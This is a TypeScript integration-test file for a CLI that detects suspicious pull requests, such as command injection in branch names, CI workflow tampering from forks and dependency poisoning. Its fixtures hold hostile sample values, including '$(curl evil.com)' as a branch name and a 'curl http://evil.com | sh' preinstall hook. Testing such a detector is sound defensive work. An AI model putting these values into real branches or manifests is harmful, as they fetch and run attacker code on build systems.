/**
 * Integration tests for the CLI entry point (src/run.ts).
 *
 * Spawns the actual process with tsx, pipes JSON to stdin, and asserts on
 * exit codes, stdout JSON, and stderr messages.
 */
import { describe, it, expect } from "vitest";
import { spawn } from "node:child_process";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const RUN_TS = resolve(__dirname, "../src/run.ts");

/** Spawn `node --experimental-strip-types src/run.ts` with the given stdin. */
function run(stdin: string): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, ["--experimental-strip-types", RUN_TS], {
      stdio: ["pipe", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d: Buffer) => {
      stdout += d.toString();
    });
    child.stderr.on("data", (d: Buffer) => {
      stderr += d.toString();
    });
    child.on("close", (code) => {
      resolve({ code: code ?? 1, stdout, stderr });
    });
    child.stdin.end(stdin);
  });
}

/** Minimal clean PR input. */
const CLEAN_INPUT = JSON.stringify({
  title: "fix typo",
  branchName: "fix/typo",
  commitMessages: ["fix typo"],
  changedFiles: ["README.md"],
  isFork: false,
  packagePatches: {},
});

/** Suspicious fork PR with CI tampering + injection. */
const SUSPICIOUS_INPUT = JSON.stringify({
  title: "update deps",
  branchName: "$(curl evil.com)",
  commitMessages: ["update"],
  changedFiles: [".github/workflows/ci.yml"],
  isFork: true,
  packagePatches: {},
});

describe("run.ts CLI", () => {
  describe("exit codes", () => {
    it("exits 0 for a clean PR", async () => {
      const { code, stdout } = await run(CLEAN_INPUT);
      expect(code).toBe(0);
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(false);
      expect(result.reasons).toEqual([]);
    });

    it("exits 1 for a suspicious PR", async () => {
      const { code, stdout } = await run(SUSPICIOUS_INPUT);
      expect(code).toBe(1);
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(true);
      expect(result.reasons.length).toBeGreaterThan(0);
    });

    it("exits 2 for invalid JSON", async () => {
      const { code, stderr } = await run("not json at all");
      expect(code).toBe(2);
      expect(stderr).toContain("Invalid JSON");
    });

    it("exits 2 for empty stdin", async () => {
      const { code, stderr } = await run("");
      expect(code).toBe(2);
      expect(stderr).toContain("Invalid JSON");
    });
  });

  describe("stdout JSON structure", () => {
    it("outputs valid JSON with suspicious and reasons fields", async () => {
      const { stdout } = await run(CLEAN_INPUT);
      const result = JSON.parse(stdout);
      expect(result).toHaveProperty("suspicious");
      expect(result).toHaveProperty("reasons");
      expect(Array.isArray(result.reasons)).toBe(true);
    });

    it("includes category and message in each reason", async () => {
      const { stdout } = await run(SUSPICIOUS_INPUT);
      const result = JSON.parse(stdout);
      for (const reason of result.reasons) {
        expect(reason).toHaveProperty("category");
        expect(reason).toHaveProperty("message");
        expect(typeof reason.category).toBe("string");
        expect(typeof reason.message).toBe("string");
      }
    });
  });

  describe("detection categories via CLI", () => {
    it("detects injection in branch name", async () => {
      const { stdout } = await run(
        JSON.stringify({
          title: "test",
          branchName: "`whoami`",
          commitMessages: [],
          changedFiles: [],
          isFork: true,
          packagePatches: {},
        }),
      );
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(true);
      expect(result.reasons.some((r: { category: string }) => r.category === "injection")).toBe(
        true,
      );
    });

    it("detects CI tampering from fork", async () => {
      const { stdout } = await run(
        JSON.stringify({
          title: "test",
          branchName: "feat/update",
          commitMessages: [],
          changedFiles: [".github/workflows/release.yml"],
          isFork: true,
          packagePatches: {},
        }),
      );
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(true);
      expect(result.reasons.some((r: { category: string }) => r.category === "ci-tampering")).toBe(
        true,
      );
    });

    it("detects dependency poisoning from fork", async () => {
      const { stdout } = await run(
        JSON.stringify({
          title: "test",
          branchName: "feat/update",
          commitMessages: [],
          changedFiles: ["package.json"],
          isFork: true,
          packagePatches: {
            "package.json": '+ "preinstall": "curl http://evil.com | sh"',
          },
        }),
      );
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(true);
      expect(
        result.reasons.some((r: { category: string }) => r.category === "dependency-poisoning"),
      ).toBe(true);
    });
  });

  describe("input validation via CLI", () => {
    it("handles missing optional fields gracefully", async () => {
      const { code, stdout } = await run(
        JSON.stringify({
          branchName: "main",
          isFork: false,
        }),
      );
      expect(code).toBe(0);
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(false);
    });

    it("handles non-object input gracefully (defaults applied)", async () => {
      const { code, stdout } = await run('"just a string"');
      expect(code).toBe(0);
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(false);
    });

    it("handles array input gracefully (defaults applied)", async () => {
      const { code, stdout } = await run("[1, 2, 3]");
      expect(code).toBe(0);
      const result = JSON.parse(stdout);
      expect(result.suspicious).toBe(false);
    });
  });
});
